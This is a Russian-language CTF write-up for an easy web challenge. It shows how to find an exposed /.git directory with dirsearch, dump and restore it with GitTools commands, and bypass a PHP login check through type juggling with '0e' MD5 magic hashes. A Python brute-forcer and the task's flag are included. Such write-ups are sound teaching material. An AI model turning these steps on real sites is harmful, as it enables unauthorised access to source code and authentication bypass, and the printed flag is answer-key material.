# Начинающий жонглер | easy | web

## Информация
> Вам необходимо научиться самому важному трюку жонглера. Попадите на его представление и узнайте все секреты

## Выдать участникам
Ссылка [link](http://tasks.polyctf.ru:30000/)

## Описание
В данном задании необходимо восстановить коммит из открытой директории /.git и воспользоваться уязвимостью php type juggling

## Решение
Для решения этого задания можно воспользоваться утилитой dirsearch, для того чтобы увидеть доступность директории /.git:

![dirsearch.png](solve/dirsearch.png)

Далее неободимо выгрузить и восстановить содержимое из папки /.git. Для этого можно использовать утилиту [GitTools](https://github.com/internetwache/GitTools/tree/master)

Для начала выгрузим содержимое с помощью скрипта gitdumper.sh:

`./gitdumper.sh http://tasks.polyctf.ru:30000/.git/ ./project`

![dumper.png](solve/dumper.png)

Далее восстановить коммиты через утилиту extractor.sh:

`./extractor.sh ./project ./final`

![extractor.png](solve/extractor.png)

После этой операци был получен исходный коммит. Нужно проанализировать его работу и понять как обрабатывается форма для получения бесплатного билета

![index.png](solve/index.png)

В данном коде можно увидеть типовую уязвимость – php type juggling, завязанную на коллизии в md5. Необходимо написать небольшой код для подбора такого ключа, хеш которого, начинается на 0e и состоит только из цифр. Однако, необходимый ключ можно найти [тут](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md)

Пример кода для подбора ключа:
```
import hashlib

def find_md5_collision(prefix):
    i = 0
    while True:
        candidate = f"{i}"
        hashed = hashlib.md5(candidate.encode()).hexdigest()
        
        if hashed.startswith(prefix) and hashed[2:].isdigit():
            return candidate, hashed
        
        i += 1

if __name__ == "__main__":
    prefix = "0e"
    result = find_md5_collision(prefix)
    print(f"Найдено строка: {result[0]}, Хеш: {result[1]}")
```

## Флаг
`PolyCTF{MD5_AnD_tyPE_jUG9L!n6_IN_PHP_@R3_7r!Cky}`
